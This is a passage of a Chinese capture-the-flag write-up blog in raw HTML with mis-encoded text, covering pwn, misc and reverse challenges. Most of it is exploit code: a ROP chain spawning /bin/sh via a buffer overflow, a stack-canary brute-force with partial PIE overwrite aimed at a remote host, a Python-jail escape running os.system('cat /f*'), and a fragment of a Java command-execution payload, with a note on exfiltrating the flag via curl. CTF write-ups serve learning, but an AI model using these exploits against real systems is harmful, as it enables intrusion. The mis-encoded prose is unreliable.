String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨curlå¤–å¸¦flagå³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685268408418-725f086c-ecf3-4b0c-ba3a-ab2b4af493db.png" alt="image.png"></p><h1 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="27æ—¥-çƒ§çƒ¤æ‘Šå„¿"><a href="#27æ—¥-çƒ§çƒ¤æ‘Šå„¿" class="headerlink" title="27æ—¥_çƒ§çƒ¤æ‘Šå„¿"></a>27æ—¥_çƒ§çƒ¤æ‘Šå„¿</h2><p>æœ¬åœ°æ‰§è¡Œå‘ç°ä¹°ä¸œè¥¿æ˜¯å¦‚æœè¾“å…¥è´Ÿæ•°ä¼šç»™è‡ªå·±åŠ é’±ï¼Œç„¶åä¹°ä¸‹åº—é“ºï¼Œæ”¹åï¼Œå‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¯•å‡ºæº¢å‡ºä¸º0x28ï¼Œå› ä¸ºæ˜¯é™æ€ï¼Œæ‰€ä»¥ç”¨ROPgadget â€“binary shaokao â€“ropchainå¯ä»¥è·å¾—payloadï¼Œåªéœ€è¦å¡«åç§»å³å¯ã€‚<br>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote()</span></span><br><span class="line">io=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;-1000000&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p))</span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><ul><li>åˆ©ç”¨forkæ— é™åˆ›å»ºå­è¿›ç¨‹å»çˆ†ç ´å‡ºcanaryï¼Œæœ€ååˆ©ç”¨ç©·ä¸¾å»partial writeä»è€Œç»•è¿‡pie<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">elf = ELF(&#x27;./funcanary&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">if local:</span><br><span class="line">    p = process(&#x27;./funcanary&#x27;)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    p = remote(&#x27;47.94.206.10&#x27;,29297)</span><br><span class="line">   # libc = ELF(&#x27;./&#x27;)</span><br><span class="line">p.recvuntil(&#x27;welcome\n&#x27;)</span><br><span class="line">canary = b&#x27;\x00&#x27;</span><br><span class="line">for k in range(7):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print (&quot;the &quot; + str(k) + &quot;: &quot; + str(i))</span><br><span class="line">        p.send(b&#x27;a&#x27;*0x68 + canary + p8(i))</span><br><span class="line">        a = p.recvuntil(&quot;welcome\n&quot;)</span><br><span class="line">        print (a)</span><br><span class="line">        if &quot;fun&quot; in str(a):</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                print(&#x27;canary:&#x27;)</span><br><span class="line">                print(canary)</span><br><span class="line">                break</span><br><span class="line">                </span><br><span class="line">print(canary)</span><br><span class="line">target=0x1228</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x02&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x12&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x22&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x32&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x42&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x52&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x62&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x72&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x82&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x92&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xa2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xb2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xc2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xd2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xe2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xf2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h1><h2 id="27-ç­¾åˆ°å¡"><a href="#27-ç­¾åˆ°å¡" class="headerlink" title="27_ç­¾åˆ°å¡"></a>27_ç­¾åˆ°å¡</h2><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266137154-e562de8e-145a-4c53-9ba4-1d691c3b6c0a.png" alt="image.png"><br>æŠŠ/etc/passwdæ”¹ä¸º/flagå³å¯<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266206911-f3dfffcb-b96c-4bfc-9c6c-8bbaa548aa14.png" alt="image.png"><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2>ncåˆ°è¿œç«¯ï¼Œå‘ç°è¾“å…¥ä»€ä¹ˆå‘½ä»¤éƒ½æ˜¯nopï¼Œä½†æ˜¯å­—ç¬¦ä¸²å¯ä»¥å›æ˜¾ï¼Œä½†æ˜¯é•¿åº¦è¿˜æœ‰æ‰€é™åˆ¶ï¼Œç”¨â€œ_â€æ‹¼æ¥ï¼ˆâ€œ_â€å¯ä»¥è¡¨ç¤ºä¸Šä¸€æ¬¡æ‰§è¡Œçš„ç»“æœï¼‰ï¼Œå†ç”¨â€œ+â€æ‹¼æ¥æˆä¸€æ¡å­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œç”¨eval()å‡½æ•°æ‰§è¡Œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;__imp&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__imp&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;ort&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__import&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;__(&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__import__(&#x27;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;os&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&quot;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;).&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).&quot;</span></span><br><span class="line">_+<span class="string">&quot;sys&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).sys&quot;</span></span><br><span class="line">_+<span class="string">&quot;tem&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system&quot;</span></span><br><span class="line">_+<span class="string">&quot;(&#x27;c&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;c&quot;</span></span><br><span class="line">_+<span class="string">&quot;at &quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat &quot;</span></span><br><span class="line">_+<span class="string">&quot;/f*&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&quot;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(_)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç½‘ç»œå®‰å…¨äººæ‰å®æˆ˜èƒ½åŠ›è¯„ä»·ç°çŠ¶è°ƒæŸ¥é—®å·"><a href="#ç½‘ç»œå®‰å…¨äººæ‰å®æˆ˜èƒ½åŠ›è¯„ä»·ç°çŠ¶è°ƒæŸ¥é—®å·" class="headerlink" title="ç½‘ç»œå®‰å…¨äººæ‰å®æˆ˜èƒ½åŠ›è¯„ä»·ç°çŠ¶è°ƒæŸ¥é—®å·"></a>ç½‘ç»œå®‰å…¨äººæ‰å®æˆ˜èƒ½åŠ›è¯„ä»·ç°çŠ¶è°ƒæŸ¥é—®å·</h2><p>äº¤å®Œé—®å·å‡ºflag</p><h1 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p>å…ˆæ‰“å¼€çœ‹çœ‹ï¼Œxmlä¸æ˜¯å¾ˆæ‡‚ï¼Œgoogleäº†ä¸€ä¸‹<a href="https://snap.berkeley.edu/">snap</a>è¿™ä¸ªç½‘ç«™ç”¨æ³•ï¼Œæ‰“å¼€è¿™ä¸ªç½‘ç«™å¯¼å…¥xmlã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574488-88897496-5683-4038-a914-e540254aaf7f.png" 